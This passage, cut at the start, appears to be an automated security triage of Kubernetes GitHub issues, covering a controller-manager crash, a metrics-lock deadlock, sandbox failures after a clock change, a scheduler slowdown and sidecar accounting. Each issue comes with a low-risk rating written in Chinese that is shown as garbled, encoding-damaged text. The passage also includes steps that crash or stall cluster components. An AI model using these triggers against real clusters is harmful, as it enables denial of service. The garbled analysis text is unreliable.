kube-system          kindnet-22kmz                               1/1     Running   0          2m58s
kube-system          kube-apiserver-ovn-control-plane            1/1     Running   0          3m5s
kube-system          kube-controller-manager-ovn-control-plane   1/1     Running   0          3m5s
kube-system          kube-proxy-8z75j                            1/1     Running   0          2m58s
kube-system          kube-scheduler-ovn-control-plane            1/1     Running   0          3m5s
local-path-storage   local-path-provisioner-57c5987fd4-sgvtl     1/1     Running   0          2m57s

â¯ cat service.yaml                                                  
apiVersion: v1
kind: Service
metadata:
  name: example-service
spec:
  selector:
    app: example
  ports:
    - port: 8765
      targetPort: 9376
  type: LoadBalancer

â¯ kubectl apply -f service.yaml    
service/example-service created

â¯ kubectl get pods -A           
NAMESPACE            NAME                                        READY   STATUS    RESTARTS   AGE
kube-system          coredns-6f6b679f8f-2xrm5                    1/1     Running   0          5m15s
kube-system          coredns-6f6b679f8f-zpkp2                    1/1     Running   0          5m15s
kube-system          etcd-ovn-control-plane                      1/1     Running   0          5m24s
kube-system          kindnet-22kmz                               1/1     Running   0          5m16s
kube-system          kube-apiserver-ovn-control-plane            1/1     Running   0          5m23s
kube-system          kube-controller-manager-ovn-control-plane   1/1     Running   0          5m23s
kube-system          kube-proxy-8z75j                            1/1     Running   0          5m16s
kube-system          kube-scheduler-ovn-control-plane            1/1     Running   0          5m23s
local-path-storage   local-path-provisioner-57c5987fd4-sgvtl     1/1     Running   0          5m15s

â¯ kubectl patch service example-service -p '{"spec":{"externalTrafficPolicy":"Local"}}'
service/example-service patched

â¯ kubectl get pods -A                                                                  
NAMESPACE            NAME                                        READY   STATUS    RESTARTS     AGE
...
kube-system          kube-controller-manager-ovn-control-plane   0/1     Running   1 (2s ago)   6m25s
...
```


#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
Client Version: v1.30.2
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.31.0
```

</details>


#### Cloud provider

<details>
None
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨æœªæŒ‡å®š 'cloud-provider' æ—¶ï¼Œå¯åŠ¨ kube-controller-managerï¼Œå½“åˆ›å»ºæˆ–ä¿®æ”¹ç‰¹å®šç±»å‹çš„Serviceæ—¶ï¼Œä¼šå¯¼è‡´controller manager å´©æºƒã€‚å…·ä½“æ¥è¯´ï¼Œå½“åˆ›å»ºä¸€ä¸ªç±»å‹ä¸º LoadBalancer çš„ Serviceï¼Œå¹¶è®¾ç½® 'externalTrafficPolicy' ä¸º 'Local'ï¼Œä¼šè§¦å‘ kube-controller-manager çš„å´©æºƒã€‚

å´©æºƒçš„åŸå› æ˜¯ service-lb-controller è¢«å®ä¾‹åŒ–ä½†æœªå¯åŠ¨ï¼Œå®ƒçš„éƒ¨åˆ†åˆå§‹åŒ–ä¾èµ–åœ¨ 'Run' æ–¹æ³•ä¸­è¿›è¡Œï¼Œä½†å¤„ç†ç¨‹åºåœ¨å®ä¾‹åŒ–æ—¶å·²è¢«æ·»åŠ åˆ° informerï¼Œè¿™å¯¼è‡´åœ¨å¤„ç†æ—¶ç”±äºæœªæ­£ç¡®åˆå§‹åŒ–éƒ¨åˆ†ç»„ä»¶ï¼ˆå¦‚äº‹ä»¶è®°å½•å™¨ï¼‰ï¼Œä»è€Œå¼•å‘ panicã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ï¼Œå°½ç®¡æ”»å‡»è€…å¯ä»¥é€šè¿‡åˆ›å»ºæˆ–ä¿®æ”¹ç‰¹å®šçš„ Service æ¥å¯¼è‡´ kube-controller-manager å´©æºƒï¼Œä½†è¿™éœ€è¦å…·å¤‡åˆ›å»ºæˆ–ä¿®æ”¹ Service çš„æƒé™ï¼Œè¿™æ˜¯éåªè¯»æƒé™ã€‚æ ¹æ®æ ‡å‡†4ï¼Œå¦‚æœæ¼æ´åˆ©ç”¨éœ€è¦æ”»å‡»è€…å…·å¤‡åˆ›å»ºã€ä¿®æ”¹ç­‰éåªè¯»æƒé™ï¼Œåˆ™ä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚

å› æ­¤ï¼Œè¯¥é—®é¢˜çš„é£é™©è¯„çº§åˆ¤æ–­ä¸ºä½é£é™©ã€‚

---

## Issue #127992 Components hang forever due to a bug in parsing allow metric labels manifest

- Issue é“¾æ¥ï¼š[#127992](https://github.com/kubernetes/kubernetes/issues/127992)

### Issue å†…å®¹

#### What happened?

The components hang forever when initializing with `allow-metric-labels-manifest` is set.

For example, kube-scheduler set the flag as follows
```
root@dev-control-plane:/etc/kubernetes/manifests# cat kube-scheduler.yaml |grep -A8 command
  - command:
    - kube-scheduler
    - --authentication-kubeconfig=/etc/kubernetes/scheduler.conf
    - --authorization-kubeconfig=/etc/kubernetes/scheduler.conf
    - --bind-address=127.0.0.1
    - --kubeconfig=/etc/kubernetes/scheduler.conf
    - --leader-elect=true
    - --allow-metric-labels-manifest=/etc/kubernetes/allow-list.yaml
    image: registry.k8s.io/kube-scheduler:v1.30.0
```
It hangs forever
```
root@dev-control-plane:/etc/kubernetes# kubectl logs -n kube-system kube-scheduler-dev-control-plane -f
I1011 00:10:55.222334       1 serving.go:380] Generated self-signed cert in-memory



^C
```

It should be due to the bug in function [SetLabelAllowListFromManifest](https://github.com/kubernetes/kubernetes/blob/c15581b277e9e42d830898357fdbd92dcf7981c6/staging/src/k8s.io/component-base/metrics/opts.go#L366) which locks the `allowListLock` and tries to double lock in [here](https://github.com/kubernetes/kubernetes/blob/c15581b277e9e42d830898357fdbd92dcf7981c6/staging/src/k8s.io/component-base/metrics/opts.go#L379)

#### What did you expect to happen?

The component start and run properly. e.g.
```
root@dev-control-plane:/etc/kubernetes/manifests# kubectl logs -n kube-system kube-scheduler-dev-control-plane -f
I1011 00:20:14.946492       1 serving.go:380] Generated self-signed cert in-memory
I1011 00:20:15.109004       1 server.go:154] "Starting Kubernetes Scheduler" version="v1.30.0"
I1011 00:20:15.109046       1 server.go:156] "Golang settings" GOGC="" GOMAXPROCS="" GOTRACEBACK=""
I1011 00:20:15.113642       1 configmap_cafile_content.go:202] "Starting controller" name="client-ca::kube-system::extension-apiserver-authentication::client-ca-file"
I1011 00:20:15.113671       1 configmap_cafile_content.go:202] "Starting controller" name="client-ca::kube-system::extension-apiserver-authentication::requestheader-client-ca-file"
I1011 00:20:15.113643       1 requestheader_controller.go:169] Starting RequestHeaderAuthRequestController
I1011 00:20:15.113762       1 secure_serving.go:213] Serving securely on 127.0.0.1:10259
I1011 00:20:15.113802       1 shared_informer.go:313] Waiting for caches to sync for RequestHeaderAuthRequestController
I1011 00:20:15.113869       1 tlsconfig.go:240] "Starting DynamicServingCertificateController"
I1011 00:20:15.113668       1 shared_informer.go:313] Waiting for caches to sync for client-ca::kube-system::extension-apiserver-authentication::client-ca-file
I1011 00:20:15.113707       1 shared_informer.go:313] Waiting for caches to sync for client-ca::kube-system::extension-apiserver-authentication::requestheader-client-ca-file
I1011 00:20:15.214278       1 shared_informer.go:320] Caches are synced for client-ca::kube-system::extension-apiserver-authentication::client-ca-file
I1011 00:20:15.214325       1 leaderelection.go:250] attempting to acquire leader lease kube-system/kube-scheduler...
I1011 00:20:15.214474       1 shared_informer.go:320] Caches are synced for client-ca::kube-system::extension-apiserver-authentication::requestheader-client-ca-file
I1011 00:20:15.214495       1 shared_informer.go:320] Caches are synced for RequestHeaderAuthRequestController
I1011 00:20:32.976351       1 leaderelection.go:260] successfully acquired lease kube-system/kube-scheduler
```

#### How can we reproduce it (as minimally and precisely as possible)?

Mount the correct format allow-list manifest to the pod and set the `--allow-metric-label-manfiests` flag
e.g. static kube-scheduler manfiest
```
apiVersion: v1
kind: Pod
metadata:
  creationTimestamp: null
  labels:
    component: kube-scheduler
    tier: control-plane
  name: kube-scheduler
  namespace: kube-system
spec:
  containers:
  - command:
    - kube-scheduler
    - --authentication-kubeconfig=/etc/kubernetes/scheduler.conf
    - --authorization-kubeconfig=/etc/kubernetes/scheduler.conf
    - --bind-address=127.0.0.1
    - --kubeconfig=/etc/kubernetes/scheduler.conf
    - --leader-elect=true
    image: registry.k8s.io/kube-scheduler:v1.30.0
    imagePullPolicy: IfNotPresent
    livenessProbe:
      failureThreshold: 8
      httpGet:
        host: 127.0.0.1
        path: /healthz
        port: 10259
        scheme: HTTPS
      initialDelaySeconds: 10
      periodSeconds: 10
      timeoutSeconds: 15
    name: kube-scheduler
    resources:
      requests:
        cpu: 100m
    startupProbe:
      failureThreshold: 24
      httpGet:
        host: 127.0.0.1
        path: /healthz
        port: 10259
        scheme: HTTPS
      initialDelaySeconds: 10
      periodSeconds: 10
      timeoutSeconds: 15
    volumeMounts:
    - mountPath: /etc/kubernetes/scheduler.conf
      name: kubeconfig
      readOnly: true
    - mountPath: /etc/kubernetes/allow-list.yaml
      name: allowlist
      readOnly: true
  hostNetwork: true
  priority: 2000001000
  priorityClassName: system-node-critical
  securityContext:
    seccompProfile:
      type: RuntimeDefault
  volumes:
  - hostPath:
      path: /etc/kubernetes/scheduler.conf
      type: FileOrCreate
    name: kubeconfig
  - hostPath:
      path: /etc/kubernetes/allow-list.yaml
      type: File
    name: allowlist
```
Then check the pod's log
```
root@dev-control-plane:/etc/kubernetes/manifests# kubectl logs -n kube-system kube-scheduler-dev-control-plane -f
```

#### Anything else we need to know?

It should be an easy fix by removing the locking logic https://github.com/kubernetes/kubernetes/blob/c15581b277e9e42d830898357fdbd92dcf7981c6/staging/src/k8s.io/component-base/metrics/opts.go#L366 and adding more test to cover this.

Also, I've sent a PR to update the documentation to apply the correct manifest format 
https://github.com/kubernetes/website/pull/48283

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
Client Version: v1.30.0
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
ç»è¿‡åˆ†æï¼Œè¯¥Issueæè¿°äº†åœ¨ç»„ä»¶åˆå§‹åŒ–æ—¶è®¾ç½®`--allow-metric-labels-manifest`å‚æ•°ä¼šå¯¼è‡´ç»„ä»¶ä¸€ç›´æŒ‚èµ·ã€‚åŸå› æ˜¯åœ¨`SetLabelAllowListFromManifest`å‡½æ•°ä¸­é”™è¯¯åœ°å¯¹`allowListLock`è¿›è¡Œäº†äºŒæ¬¡é”å®šï¼Œå¯¼è‡´æ­»é”ã€‚è™½ç„¶è¯¥é—®é¢˜ä¼šå¯¼è‡´ç»„ä»¶ä¸å¯ç”¨ï¼Œå…·æœ‰æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰çš„é£é™©ï¼Œä½†éœ€è¦æ”»å‡»è€…å…·æœ‰ä¿®æ”¹ç»„ä»¶å¯åŠ¨å‚æ•°æˆ–é…ç½®æ–‡ä»¶çš„æƒé™ï¼Œæ‰èƒ½è§¦å‘è¯¥æ¼æ´ã€‚è¿™é€šå¸¸éœ€è¦è¾ƒé«˜çš„æƒé™ï¼Œæ™®é€šç”¨æˆ·æ— æ³•åˆ©ç”¨ã€‚å› æ­¤ï¼Œæ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬4æ¡ï¼Œè¯¥æ¼æ´ä¸å±äºé«˜é£é™©ï¼ŒCVSSè¯„åˆ†åœ¨Highä»¥ä¸‹ï¼Œå±äºä½é£é™©å®‰å…¨é—®é¢˜ã€‚

---

## Issue #127948 PodSandbox cannot be created if the time in the server is changed by incident

- Issue é“¾æ¥ï¼š[#127948](https://github.com/kubernetes/kubernetes/issues/127948)

### Issue å†…å®¹

#### What happened?

Recently the CMOS battery is faulty, we did a change and rebooted the node. After rebooting, we found almost of pods cannot be created by kubelet + containerd.

The timeline is like this
1. **_time:  Sep  26  19:55:45 -07 2024_**. We have a pod created at **_2024-09-05T14:20:50.537022918-07:00_**
  ```
 aff8aea34f502       4 weeks ago         Ready            x-generic22-kdw2k              sdprod              0                   (default)
  ```
2. Shutdown and change the CMOS battery, the time is set to **_Tue Nov 21 13:57 - 05:46_**. 
3. After rebooting the node, kubelet started to work before time is synced by chrony. It will create a new sandbox 0b4c9da99f482 with timestamp _**2023-11-21T13:57:27.095899765-07:00**_
```
aff8aea34f502       4 weeks ago         NotReady            x-generic22-kdw2k                        sdprod              0                   (default)
0b4c9da99f482       10 months ago       Ready            x-generic22-kdw2k                    sdprod             1                   (default)
```
4. After the time is synced by chrony, kubelet will re-create the sandbox because the ready sandbox is not the latest one. The latest one is aff8aea34f502. The attempt is 0. So kubelet will use attempt +1 = 1 as the new attempt. but creating sandbox will fail. 
```
aff8aea34f502       4 weeks ago         NotReady            x-generic22-kdw2k                        sdprod              0                   (default)
0b4c9da99f482       10 months ago       NotReady            x-generic22-kdw2k                    sdprod             1                   (default)
```
The error is like this.
```
 kubelet[64266]: E1008 19:17:18.914095   64266 pod_workers.go:1300] "Error syncing pod, skipping" err="failed to "CreatePodSandbox" for "x-generic22-kdw2k_sdprod(e7a70473-71a5-40de-a60e-5da5e756f7ff)\" with CreatePodSandboxError: "Failed to create sandbox for pod "x-generic22-kdw2k_sdprode7a70473-71a5-40de-a60e-5da5e756f7ff)": rpc error: code = Unknown desc = failed to reserve sandbox name "x-generic22-kdw2k_sdprod_e7a70473-71a5-40de-a60e-5da5e756f7ff_1": name "x-generic22-kdw2k_sdprod_e7a70473-71a5-40de-a60e-5da5e756f7ff_1" is reserved for\"0b4c9da99f48214325378cc779b799d8f2becae18e9ea9d0f3fb72c42d8fbd98"" pod="sdprod/ x-generic22-kdw2k" podUID="e7a70473-71a5-40de-a60e-5da5e756f7ff" 

```

https://github.com/kubernetes/kubernetes/blob/master/pkg/kubelet/kuberuntime/util/util.go#L42

```
func PodSandboxChanged(pod *v1.Pod, podStatus *kubecontainer.PodStatus) (bool, uint32, string) {
...
// Needs to create a new sandbox when readySandboxCount > 1 or the ready sandbox is not the latest one.
	sandboxStatus := podStatus.SandboxStatuses[0]
	if readySandboxCount > 1 {
		klog.V(2).InfoS("Multiple sandboxes are ready for Pod. Need to reconcile them", "pod", klog.KObj(pod))
		return true, sandboxStatus.Metadata.Attempt + 1, sandboxStatus.Id
	}
	if sandboxStatus.State != runtimeapi.PodSandboxState_SANDBOX_READY {
		klog.V(2).InfoS("No ready sandbox for pod can be found. Need to start a new one", "pod", klog.KObj(pod))
		return true, sandboxStatus.Metadata.Attempt + 1, sandboxStatus.Id
	}
```
When we calculate the attempt, is it better to get the maximum value of all the sandboxStatus.Metadata.Attempt?






#### What did you expect to happen?

Use attempt =2 to create the new sandbox and the pod can be up.

#### How can we reproduce it (as minimally and precisely as possible)?

1. disable chrony
2. change the date to a few days ago. It must be before the sandbox creation timestamp.
3. reboot
4. kubelet will be up
5. new sandbox will be created
6. enable chrony

#### Anything else we need to know?

_No response_

#### Kubernetes version



```
1.18.12
```


#### Cloud provider

<details>
none
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥Issueæè¿°äº†åœ¨æœåŠ¡å™¨æ—¶é—´è¢«æ„å¤–ä¿®æ”¹çš„æƒ…å†µä¸‹ï¼ŒPodSandboxæ— æ³•è¢«åˆ›å»ºçš„é—®é¢˜ã€‚å…·ä½“æƒ…å†µæ˜¯ï¼Œå½“æœåŠ¡å™¨çš„CMOSç”µæ± æ•…éšœï¼Œå¯¼è‡´ç³»ç»Ÿæ—¶é—´è¢«é‡ç½®ï¼Œkubeletåœ¨æ—¶é—´åŒæ­¥ä¹‹å‰å¯åŠ¨ï¼Œä¼šåˆ›å»ºä¸€ä¸ªå¸¦æœ‰é”™è¯¯æ—¶é—´æˆ³çš„sandboxã€‚åœ¨æ—¶é—´åŒæ­¥åï¼Œkubeletå°è¯•é‡æ–°åˆ›å»ºsandboxï¼Œä½†ç”±äºæ—¶é—´æˆ³é—®é¢˜ï¼Œå¯¼è‡´åˆ›å»ºå¤±è´¥ï¼ŒPodæ— æ³•æ­£å¸¸å¯åŠ¨ã€‚

ä»å®‰å…¨è§’åº¦è€ƒè™‘ï¼Œæ”»å‡»è€…å¦‚æœèƒ½å¤Ÿä¿®æ”¹æœåŠ¡å™¨çš„ç³»ç»Ÿæ—¶é—´ï¼Œå¯èƒ½ä¼šè§¦å‘è¯¥é—®é¢˜ï¼Œå¯¼è‡´Kubernetesé›†ç¾¤ä¸­çš„Podæ— æ³•åˆ›å»ºï¼Œé€ æˆæ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ã€‚ç„¶è€Œï¼Œä¿®æ”¹ç³»ç»Ÿæ—¶é—´éœ€è¦rootæƒé™ï¼Œåªæœ‰å…·å¤‡é«˜æƒé™çš„ç”¨æˆ·æ‰èƒ½æ‰§è¡Œæ­¤æ“ä½œã€‚

æ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬4æ¡ï¼Œå¯¹äºéœ€è¦é«˜æƒé™æ‰èƒ½å®æ–½çš„æ‹’ç»æœåŠ¡æ”»å‡»ï¼Œä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ï¼ŒCVSSè¯„çº§åœ¨highä»¥ä¸‹ã€‚å› æ­¤ï¼Œè¯¥é—®é¢˜çš„å®‰å…¨é£é™©è¯„çº§ä¸ºä½é£é™©ã€‚

**å¤ç°è¿‡ç¨‹ï¼š**

```json
[
  {
    "cmd": "systemctl stop chronyd",
    "explain": "åœæ­¢æ—¶é—´åŒæ­¥æœåŠ¡chronyï¼Œé˜²æ­¢æ—¶é—´è‡ªåŠ¨åŒæ­¥ã€‚"
  },
  {
    "cmd": "date -s '2023-09-01 12:00:00'",
    "explain": "å°†ç³»ç»Ÿæ—¥æœŸä¿®æ”¹ä¸ºè¿‡å»çš„æ—¶é—´ï¼Œä¾‹å¦‚2023å¹´9æœˆ1æ—¥12:00:00ã€‚"
  },
  {
    "cmd": "reboot",
    "explain": "é‡å¯ç³»ç»Ÿï¼Œä½¿ä¿®æ”¹çš„æ—¶é—´ç”Ÿæ•ˆã€‚"
  },
  {
    "cmd": "systemctl start kubelet",
    "explain": "å¯åŠ¨kubeletæœåŠ¡ã€‚"
  },
  {
    "cmd": "systemctl start chronyd",
    "explain": "å¯åŠ¨chronyæœåŠ¡ï¼Œæ¢å¤ç³»ç»Ÿæ—¶é—´åŒæ­¥ã€‚"
  },
  {
    "cmd": "kubectl get pods",
    "explain": "æ£€æŸ¥PodçŠ¶æ€ï¼Œæ­¤æ—¶ä¼šå‘ç°Podæ— æ³•æ­£å¸¸åˆ›å»ºã€‚"
  }
]
```

---

## Issue #127912 Regression in Scheduler Performance in Large Scale Clusters

- Issue é“¾æ¥ï¼š[#127912](https://github.com/kubernetes/kubernetes/issues/127912)

### Issue å†…å®¹

#### What happened?

Scheduler throughput and Performance has regressed in 1.31 when compared to 1.30

#### What did you expect to happen?

Scheduler throughput and Performance should at least stay same as 1.30 on 1.31 or improve. 


#### How can we reproduce it (as minimally and precisely as possible)?

I'm leveraging the [test](https://github.com/kubernetes/perf-tests/blob/master/clusterloader2/testing/scheduler-throughput/config.yaml) that I have written to measure scheduler throughput and performance by directly creating pods to APIServer without KCM controllers in the picture.

Settings:

- You can run this test with [this](https://github.com/kubernetes/perf-tests/blob/master/clusterloader2/testing/scheduler-throughput/config.yaml#L19) QPS set to `1000` and total pods [here](https://github.com/kubernetes/perf-tests/blob/master/clusterloader2/testing/scheduler-throughput/config.yaml#L1C4-L1C32 ) set to 50k 


###### Test results: You would get roughly following latency and throughput numbers for `1.30v` 

Latency: 

```
    {
      "data": {
        "Perc50": 4853.606009,
        "Perc90": 6501.635529,
        "Perc99": 7152.44798
      },
      "unit": "ms",
      "labels": {
        "Metric": "pod_startup"
      }
    },
    {
      "data": {
        "Perc50": 3750.943,
        "Perc90": 5345.859,
        "Perc99": 5861.101
      },
      "unit": "ms",
      "labels": {
        "Metric": "create_to_schedule"
      }
    }
``` 

Throughput:



```
{
  "perc50": 803,
  "perc90": 856,
  "perc99": 936,
  "max": 936
}
```




###### Test results: You would get roughly following latency and throughput numbers for `1.31v` 

Latency:

```
    {
      "data": {
        "Perc50": 10675.556409,
        "Perc90": 17805.60988,
        "Perc99": 19445.20954
      },
      "unit": "ms",
      "labels": {
        "Metric": "pod_startup"
      }
    }
    
        {
      "data": {
        "Perc50": 9579.25,
        "Perc90": 16696.174,
        "Perc99": 18275.346
      },
      "unit": "ms",
      "labels": {
        "Metric": "create_to_schedule"
      }
    },
  ```
  
  Throughput:
  
  ```
  {
  "perc50": 638,
  "perc90": 683,
  "perc99": 713,
  "max": 713
}

```
  
  
  
  




#### Anything else we need to know?



You can see that on 1.31v, the latency for `create_to_schedule` phase  increased 3X or more ( I have posted the one that has lowest latency and highest throughput among other tests that I have run) and Throughput has reduced significantly  from ~936 to ~704 at peak/p99.



When I looked at the  pprof of the runs on 1.30v and 1.31v, major differences showed up  as following:

-  Prometheus.(*gauge).Add [k8s.io/client-go/util/workqueue.ParallelizeUntil.func1]  (main contributing factor)
- k8s.io/kubernetes/pkg/scheduler/framework/parallelize.Parallelizer.Until.func1
k8s.io/kubernetes/pkg/scheduler/framework/parallelize/parallelism.go ( overall this is slightly higher on 1.31v i.e; ~57% vs ~46% on 1.30v) 

###### 1.31v pprof 

<img width="1575" alt="Screenshot 2024-10-07 at 5 19 48â€¯PM" src="https://github.com/user-attachments/assets/e6bfd4c8-4e6b-4dc0-8868-1c63d8435913">


<img width="1562" alt="Screenshot 2024-10-07 at 5 20 19â€¯PM" src="https://github.com/user-attachments/assets/f82c4ca7-c881-435e-91b1-818856968323">



###### 1.30v pprof

<img width="1576" alt="Screenshot 2024-10-07 at 5 07 22â€¯PM" src="https://github.com/user-attachments/assets/9d287529-fcfc-433a-84f5-89172c42d483">
<img width="1590" alt="Screenshot 2024-10-07 at 5 21 18â€¯PM" src="https://github.com/user-attachments/assets/a73647cf-cf45-4fe0-a5e9-e549eab053c8">



You can see that % of cpu cycles/time spent is more than doubled for Prometheus operations for the same amount of work i.e 50k pods with 1K QPS  ^^^


I can post flame graphs as well 


##### Food for thought: 

Generally we should `batch prometheus gauge operations` for performance improvement given the CPU cycles consumption in Scheduler_one go routine (as we schedule pods serially in one go routine given the nature of Scheduler) for better performance. Also, I don't think consumers would need precision at the current level that we are doing today. Generally users scrape prometheus metrics at the very least at 10sec, 30sec, 1min or 5mins interval. Would like to know what community thinks about this ? At least we should have a gating feature to configure the precision of omitting Prometheus metrics ?

#### Kubernetes version

<details>

```console
$ kubectl version

sh-4.2$ kubectl version
Client Version: v1.30.4-eks-a737599
Kustomize Version: v5.0.4-0.20230601165947-6ce0bf390ce3
Server Version: v1.30.5-eks-ce1d5eb
```

```
sh-4.2$ kubectl version
Client Version: v1.31.0-eks-a737599
Kustomize Version: v5.4.2
Server Version: v1.31.0-eks-a737599

````

</details>


#### Cloud provider

<details>
AWS
</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
```
NAME="Amazon Linux"
VERSION="2"
ID="amzn"
ID_LIKE="centos rhel fedora"
VERSION_ID="2"
PRETTY_NAME="Amazon Linux 2"
ANSI_COLOR="0;33"
CPE_NAME="cpe:2.3:o:amazon:amazon_linux:2"
HOME_URL="https://amazonlinux.com/"
SUPPORT_END="2025-06-30"
```
$ uname -a
```
Linux ip-172-16-60-69.us-west-2.compute.internal 5.10.224-212.876.amzn2.x86_64 #1 SMP Thu Aug 22 16:55:24 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
```

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


#### Related plugins (CNI, CSI, ...) and versions (if applicable)

<details>

</details>


### åˆ†æç»“æœ

**é£é™©å®šçº§ï¼š**  
ä½é£é™©

**åˆ¤æ–­ä¾æ®ï¼š**  
è¯¥IssueæŠ¥å‘Šäº†åœ¨Kubernetes 1.31ç‰ˆæœ¬ä¸­ï¼Œè°ƒåº¦å™¨ï¼ˆSchedulerï¼‰çš„æ€§èƒ½åœ¨å¤§å‹é›†ç¾¤ä¸­å‡ºç°äº†å›å½’ï¼Œç›¸è¾ƒäº1.30ç‰ˆæœ¬ï¼Œååé‡å’Œæ€§èƒ½éƒ½æœ‰æ‰€ä¸‹é™ã€‚è¿™ä¸»è¦æ˜¯ç”±äºPrometheusæŒ‡æ ‡æ›´æ–°é€ æˆçš„CPUæ¶ˆè€—å¢åŠ ï¼Œå½±å“äº†è°ƒåº¦å™¨çš„æ€§èƒ½ã€‚

ä»å®‰å…¨è§’åº¦åˆ†æï¼Œå¦‚æœæ”»å‡»è€…èƒ½å¤Ÿåˆ©ç”¨è¿™ä¸ªæ€§èƒ½é—®é¢˜ï¼Œå¯èƒ½ä¼šå¯¼è‡´æ‹’ç»æœåŠ¡ï¼ˆDoSï¼‰æ”»å‡»ã€‚ä¾‹å¦‚ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡åˆ›å»ºå¤§é‡çš„Podæ¥å¢åŠ è°ƒåº¦å™¨çš„è´Ÿè½½ï¼Œå¯¼è‡´è°ƒåº¦å™¨æ— æ³•åŠæ—¶å“åº”å…¶ä»–ç”¨æˆ·çš„è°ƒåº¦è¯·æ±‚ã€‚

ç„¶è€Œï¼Œæ ¹æ®é£é™©åˆ¤æ–­æ ‡å‡†ç¬¬4æ¡ï¼Œè‹¥æ”»å‡»è€…éœ€è¦ä¸€å®šçš„æƒé™ï¼ˆå¦‚åˆ›å»ºæˆ–ä¿®æ”¹æƒé™ï¼‰æ‰èƒ½å®æ–½æ”»å‡»ï¼Œåˆ™ä¸åº”åˆ¤æ–­ä¸ºé«˜é£é™©ã€‚åœ¨Kubernetesä¸­ï¼Œåˆ›å»ºPodéœ€è¦å…·å¤‡ç›¸åº”çš„æƒé™ï¼Œæ™®é€šæœªæˆæƒç”¨æˆ·æ— æ³•æ‰§è¡Œæ­¤æ“ä½œã€‚å› æ­¤ï¼Œè¯¥é£é™©éœ€è¦é™çº§å¤„ç†ã€‚

æ­¤å¤–ï¼Œè¯¥é—®é¢˜ä¸æ¶‰åŠå‘½ä»¤æ‰§è¡Œã€å®¹å™¨é€ƒé€¸ã€ææƒç­‰é«˜é£é™©é—®é¢˜ï¼Œä¹Ÿæœªåœ¨å¤šç”¨æˆ·åœºæ™¯ä¸‹ä½¿ä½æƒé™ç”¨æˆ·å½±å“åˆ°å…¶ä»–é«˜æƒé™ç”¨æˆ·ã€‚

ç»¼ä¸Šæ‰€è¿°ï¼Œè™½ç„¶è¯¥Issueä¸­å­˜åœ¨è¢«åˆ©ç”¨è¿›è¡Œæ‹’ç»æœåŠ¡æ”»å‡»çš„å¯èƒ½æ€§ï¼Œä½†ç”±äºéœ€è¦æ”»å‡»è€…å…·å¤‡åˆ›å»ºPodçš„æƒé™ï¼Œä¸”æœªæ¶‰åŠé«˜é£é™©çš„å®‰å…¨æ¼æ´ï¼Œæ•…é£é™©è¯„çº§åˆ¤æ–­ä¸ºä½é£é™©ã€‚

---

## Issue #127868 [SidecarContainers] Scheduler accounting sidecar resource requests as initContainers

- Issue é“¾æ¥ï¼š[#127868](https://github.com/kubernetes/kubernetes/issues/127868)

### Issue å†…å®¹

#### What happened?

As per [Sidecars KEP](https://github.com/kubernetes/enhancements/blob/master/keps/sig-node/753-sidecar-containers/README.md#resources-calculation-for-scheduling-and-pod-admission), resources calculations for scheduling pods with sidecars is : Max ( Max( each InitContainerUse ) , Sum(Sidecar Containers) + Sum(Containers) ), but [scheduler logic](https://github.com/kubernetes/kubernetes/blob/2d31ec00273c34390ec77637fb4ff96234885bca/pkg/scheduler/framework/types.go#L950-L951) is using Max(RegularContainers, InitContainers) to calculate resources.


#### What did you expect to happen?

Resource Requests = Max ( Max( each InitContainerUse ) , Sum(Sidecar Containers) + Sum(Containers) )

#### How can we reproduce it (as minimally and precisely as possible)?

https://github.com/kubernetes/kubernetes/blob/2d31ec00273c34390ec77637fb4ff96234885bca/pkg/scheduler/framework/types.go#L950-L951

#### Anything else we need to know?

_No response_

#### Kubernetes version

<details>

```console
$ kubectl version
# paste output here
```

</details>


#### Cloud provider

<details>

</details>


#### OS version

<details>

```console
# On Linux:
$ cat /etc/os-release
# paste output here
$ uname -a
# paste output here

# On Windows:
C:\> wmic os get Caption, Version, BuildNumber, OSArchitecture
# paste output here
```

</details>


#### Install tools

<details>

</details>


#### Container runtime (CRI) and version (if applicable)

<details>

</details>


